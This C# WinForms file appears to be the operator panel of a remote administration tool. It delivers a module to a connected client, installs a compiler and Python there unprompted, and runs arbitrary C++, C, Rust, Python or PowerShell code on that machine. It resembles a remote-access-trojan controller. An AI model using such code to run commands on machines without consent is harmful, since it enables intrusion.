using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    public sealed class RemoteScriptingForm : Form
    {
        private const string ModuleFile = "mullvad.Module.RemoteScripting";
        private const string ModuleId   = "mullvad.scripting";

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        private readonly TabControl            _tabs;
        private readonly Button                _btnRun;
        private readonly Button                _btnClear;
        private readonly StatusStrip           _status;
        private readonly ToolStripStatusLabel  _statusLabel;

        private readonly Label    _lblPyVersion;
        private readonly ComboBox _cboPythonVer;

        private readonly Dictionary<string, TextBox> _editors = new();
        private readonly Dictionary<string, TextBox> _outputs = new();

        private List<PythonInstall> _pythonInstalls = new();
        private bool _hasCppCompiler;

        private static readonly Dictionary<ClientHandler, RemoteScriptingForm> _openForms = new();

        public static RemoteScriptingForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new RemoteScriptingForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        private RemoteScriptingForm(ClientHandler handler)
        {
            _handler = handler;

            Text          = $"Remote Scripting — {handler.Info.Computer}";
            Size          = new Size(780, 520);
            MinimumSize   = new Size(540, 380);
            Font          = new Font("Segoe UI", 8.25f);
            StartPosition = FormStartPosition.CenterScreen;

            TrySetIcon("terminal.png");

            _lblPyVersion = new Label  { Text = "Version:", AutoSize = true, Location = new Point(4, 7) };
            _cboPythonVer = new ComboBox { DropDownStyle = ComboBoxStyle.DropDownList, Location = new Point(60, 4), Width = 260 };

            // ── Tabs — each with own editor + output ───────────────────────────
            _tabs = new TabControl { Dock = DockStyle.Fill };

            string[] langs = { "C++", "C", "Rust", "Python", "PowerShell" };
            string[] keys  = { "cpp", "c", "rust", "python", "powershell" };

            for (int i = 0; i < langs.Length; i++)
            {
                var page = new TabPage(langs[i]) { Tag = keys[i] };

                var split = new SplitContainer
                {
                    Dock            = DockStyle.Fill,
                    Orientation     = Orientation.Horizontal,
                    SplitterDistance = 240,
                };

                var editor = new TextBox
                {
                    Dock       = DockStyle.Fill,
                    Multiline  = true,
                    ScrollBars = ScrollBars.Both,
                    WordWrap   = false,
                    AcceptsTab = true,
                    Font       = new Font("Consolas", 9.5f),
                };

                var output = new TextBox
                {
                    Dock       = DockStyle.Fill,
                    Multiline  = true,
                    ReadOnly   = true,
                    ScrollBars = ScrollBars.Both,
                    WordWrap   = false,
                    Font       = new Font("Consolas", 9f),
                    BackColor  = Color.FromArgb(20, 20, 20),
                    ForeColor  = Color.FromArgb(200, 200, 200),
                };

                _editors[keys[i]] = editor;
                _outputs[keys[i]] = output;

                if (keys[i] == "python")
                {
                    var pnlPy = new Panel { Dock = DockStyle.Top, Height = 30 };
                    var btnSetup = new Button
                    {
                        Text = "Install Embedded", Location = new Point(330, 3),
                        AutoSize = true, FlatStyle = FlatStyle.Flat,
                    };
                    btnSetup.Click += (_, _) => _ = SetupPythonAsync();
                    pnlPy.Controls.AddRange(new Control[] { _lblPyVersion, _cboPythonVer, btnSetup });

                    // add editor first (Fill), then panel (Top) — panel must have higher z-order
                    split.Panel1.Controls.Add(editor);
                    split.Panel1.Controls.Add(pnlPy);
                }
                else
                {
                    split.Panel1.Controls.Add(editor);
                }

                split.Panel2.Controls.Add(output);
                page.Controls.Add(split);
                _tabs.TabPages.Add(page);
            }

            // ── Bottom bar ─────────────────────────────────────────────────────
            var pnlBar = new Panel { Dock = DockStyle.Bottom, Height = 32 };

            _btnRun = new Button
            {
                Text = "Run", Width = 75, Height = 26,
                Location = new Point(4, 3), FlatStyle = FlatStyle.Flat,
            };
            _btnRun.Click += (_, _) => _ = RunAsync();

            _btnClear = new Button
            {
                Text = "Clear", Width = 60, Height = 26,
                Location = new Point(84, 3), FlatStyle = FlatStyle.Flat,
            };
            _btnClear.Click += (_, _) => ClearCurrentOutput();

            pnlBar.Controls.AddRange(new Control[] { _btnRun, _btnClear });

            _status      = new StatusStrip();
            _statusLabel = new ToolStripStatusLabel("Initialising…") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
            _status.Items.Add(_statusLabel);

            Controls.Add(_tabs);
            Controls.Add(pnlBar);
            Controls.Add(_status);
        }

        // ── Lifecycle ────────────────────────────────────────────────────────────

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _ = InitAsync();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _ctx?.Dispose();
            base.OnFormClosed(e);
        }

        // ── Init ─────────────────────────────────────────────────────────────────

        private async Task InitAsync()
        {
            SetStatus("Delivering module…");
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes is null) { SetStatus("Module not found."); return; }

                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, null, cts.Token);
                if (!ok) { SetStatus("Module delivery failed."); return; }

                _ctx = new ModuleContext(_handler, ModuleId);
                _ctx.Disconnected += (_, _) => BeginInvoke(() => SetStatus("Client disconnected."));

                SetStatus("Detecting tools…");
                await RefreshInfoAsync();

                if (!_hasCppCompiler)
                    await SetupCompilerAsync();
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Error: {ex.Message}"));
            }
        }

        private async Task RefreshInfoAsync()
        {
            if (_ctx is null) return;
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(15));
                string json = await _ctx.ExecuteAsync("info", "", cts.Token);
                if (!IsDisposed) BeginInvoke(() => ApplyInfo(json));
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Info error: {ex.Message}"));
            }
        }

        private void ApplyInfo(string json)
        {
            string? ps   = ExtractString(json, "powershell") ?? "?";
            string? cpp  = ExtractString(json, "cpp");
            string? cc   = ExtractString(json, "cc");
            string? rust = ExtractString(json, "rustc");

            _hasCppCompiler = cpp != null || cc != null;

            _pythonInstalls.Clear();
            _cboPythonVer.Items.Clear();

            int pyStart = json.IndexOf("\"python\":[", StringComparison.Ordinal);
            if (pyStart >= 0)
            {
                int arrStart = json.IndexOf('[', pyStart);
                int arrEnd   = FindMatchingBracket(json, arrStart);
                if (arrEnd > arrStart)
                {
                    string arr = json.Substring(arrStart, arrEnd - arrStart + 1);
                    int pos = 0;
                    while (true)
                    {
                        int objStart = arr.IndexOf('{', pos);
                        if (objStart < 0) break;
                        int objEnd = arr.IndexOf('}', objStart);
                        if (objEnd < 0) break;
                        string obj = arr.Substring(objStart, objEnd - objStart + 1);
                        string ver  = ExtractString(obj, "version") ?? "?";
                        string path = ExtractString(obj, "path") ?? "";
                        _pythonInstalls.Add(new PythonInstall(ver, path));
                        _cboPythonVer.Items.Add(ver + "  —  " + path);
                        pos = objEnd + 1;
                    }
                }
            }

            if (_cboPythonVer.Items.Count > 0)
                _cboPythonVer.SelectedIndex = 0;

            var parts = new List<string>
            {
                $"PS {ps}",
                cpp != null ? "C++ ✓" : "C++ ✗",
                cc  != null ? "C ✓"   : "C ✗",
                rust != null ? "Rust ✓" : "Rust ✗",
                $"Py: {_pythonInstalls.Count}",
            };
            SetStatus(string.Join("  |  ", parts));
        }

        // ── Auto-setup compiler ──────────────────────────────────────────────────

        private async Task SetupCompilerAsync()
        {
            if (_ctx is null) return;
            SetStatus("Installing portable C/C++ compiler…");
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(300));
                string result = await _ctx.ExecuteAsync("setup_compiler", "", cts.Token);

                string? error = ExtractString(result, "error");
                if (error != null)
                {
                    SetStatus($"Compiler setup: {error}");
                    return;
                }

                await RefreshInfoAsync();
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Compiler setup error: {ex.Message}"));
            }
        }

        // ── Run ──────────────────────────────────────────────────────────────────

        private async Task RunAsync()
        {
            if (_ctx is null) { SetStatus("Not connected."); return; }

            var page = _tabs.SelectedTab;
            if (page is null) return;
            string lang = (string)page.Tag;

            if (!_editors.TryGetValue(lang, out var editor)) return;
            string code = editor.Text;
            if (string.IsNullOrWhiteSpace(code)) { SetStatus("Nothing to run."); return; }

            string pythonPath = "";
            if (lang == "python" && _cboPythonVer.SelectedIndex >= 0 && _cboPythonVer.SelectedIndex < _pythonInstalls.Count)
                pythonPath = _pythonInstalls[_cboPythonVer.SelectedIndex].Path;

            _btnRun.Enabled = false;
            SetStatus($"Running {page.Text}…");

            try
            {
                string payload = "{\"lang\":" + Json(lang) +
                                 ",\"code\":" + Json(code) +
                                 ",\"python_path\":" + Json(pythonPath) + "}";

                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(120));
                string result = await _ctx.ExecuteAsync("run", payload, cts.Token);

                if (!IsDisposed) BeginInvoke(() => HandleRunResult(lang, result));
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() =>
                {
                    AppendOutput(lang, $"Error: {ex.Message}");
                    SetStatus("Run failed.");
                });
            }
            finally
            {
                if (!IsDisposed) BeginInvoke(() => _btnRun.Enabled = true);
            }
        }

        private void HandleRunResult(string lang, string json)
        {
            string? error = ExtractString(json, "error");
            if (error != null)
            {
                AppendOutput(lang, error);
                SetStatus("Error.");
                return;
            }

            string stdout = ExtractString(json, "stdout") ?? "";
            string stderr = ExtractString(json, "stderr") ?? "";
            string ecStr  = ExtractString(json, "exit_code") ?? "0";
            string durStr = ExtractString(json, "duration_ms") ?? "0";

            if (stdout.TrimEnd().Length > 0)
                AppendOutput(lang, stdout.TrimEnd());
            if (stderr.TrimEnd().Length > 0)
                AppendOutput(lang, stderr.TrimEnd());

            SetStatus($"exit {ecStr}  |  {durStr}ms");
        }

        // ── Setup Python ─────────────────────────────────────────────────────────

        private async Task SetupPythonAsync()
        {
            if (_ctx is null) { SetStatus("Not connected."); return; }

            SetStatus("Downloading embedded Python…");
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(120));
                string result = await _ctx.ExecuteAsync("setup_python", "{\"version\":\"3.12.7\"}", cts.Token);

                string? error = ExtractString(result, "error");
                if (error != null)
                {
                    SetStatus($"Setup failed: {error}");
                    return;
                }

                string ver = ExtractString(result, "version") ?? "3.12.7";
                SetStatus($"Embedded Python {ver} installed.");
                await RefreshInfoAsync();
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Setup error: {ex.Message}"));
            }
        }

        // ── Helpers ──────────────────────────────────────────────────────────────

        private void AppendOutput(string lang, string text)
        {
            if (InvokeRequired) { BeginInvoke(() => AppendOutput(lang, text)); return; }
            if (!_outputs.TryGetValue(lang, out var output)) return;
            if (output.Text.Length > 0) output.AppendText(Environment.NewLine);
            output.AppendText(text);
        }

        private void ClearCurrentOutput()
        {
            var page = _tabs.SelectedTab;
            if (page is null) return;
            string lang = (string)page.Tag;
            if (_outputs.TryGetValue(lang, out var output))
                output.Clear();
        }

        private void SetStatus(string text)
        {
            if (InvokeRequired) { BeginInvoke(() => SetStatus(text)); return; }
            _statusLabel.Text = text;
        }

        private void TrySetIcon(string name)
        {
            var bmp = IconLoader.Load(name) as Bitmap;
            if (bmp is not null) try { Icon = Icon.FromHandle(bmp.GetHicon()); } catch { }
        }

        private static string Json(string? s)
        {
            if (s == null) return "null";
            return "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                           .Replace("\r", "\\r").Replace("\n", "\\n")
                           .Replace("\t", "\\t") + "\"";
        }

        private static string? ExtractString(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            string needle = "\"" + key + "\"";
            int idx = json.IndexOf(needle, StringComparison.Ordinal);
            if (idx < 0) return null;
            int colon = json.IndexOf(':', idx + needle.Length);
            if (colon < 0) return null;
            int s = colon + 1;
            while (s < json.Length && (json[s] == ' ' || json[s] == '\t')) s++;

            if (s < json.Length && (char.IsDigit(json[s]) || json[s] == '-'))
            {
                int e = s;
                if (json[e] == '-') e++;
                while (e < json.Length && char.IsDigit(json[e])) e++;
                return json.Substring(s, e - s);
            }
            if (s < json.Length && json[s] == 'n') return null;

            if (s >= json.Length || json[s] != '"') return null;
            s++;
            var sb = new System.Text.StringBuilder();
            for (int i = s; i < json.Length; i++)
            {
                if (json[i] == '\\' && i + 1 < json.Length)
                {
                    char c = json[++i];
                    switch (c)
                    {
                        case '"':  sb.Append('"');  break;
                        case '\\': sb.Append('\\'); break;
                        case 'n':  sb.Append('\n'); break;
                        case 'r':  sb.Append('\r'); break;
                        case 't':  sb.Append('\t'); break;
                        default:   sb.Append(c); break;
                    }
                }
                else if (json[i] == '"') break;
                else sb.Append(json[i]);
            }
            return sb.ToString();
        }

        private static int FindMatchingBracket(string s, int open)
        {
            if (open < 0 || open >= s.Length) return -1;
            char opener = s[open];
            char closer = opener == '[' ? ']' : '}';
            int depth = 1;
            bool inStr = false;
            for (int i = open + 1; i < s.Length; i++)
            {
                if (s[i] == '\\' && inStr) { i++; continue; }
                if (s[i] == '"') { inStr = !inStr; continue; }
                if (inStr) continue;
                if (s[i] == opener) depth++;
                else if (s[i] == closer && --depth == 0) return i;
            }
            return -1;
        }

        private sealed record PythonInstall(string Version, string Path);
    }
}
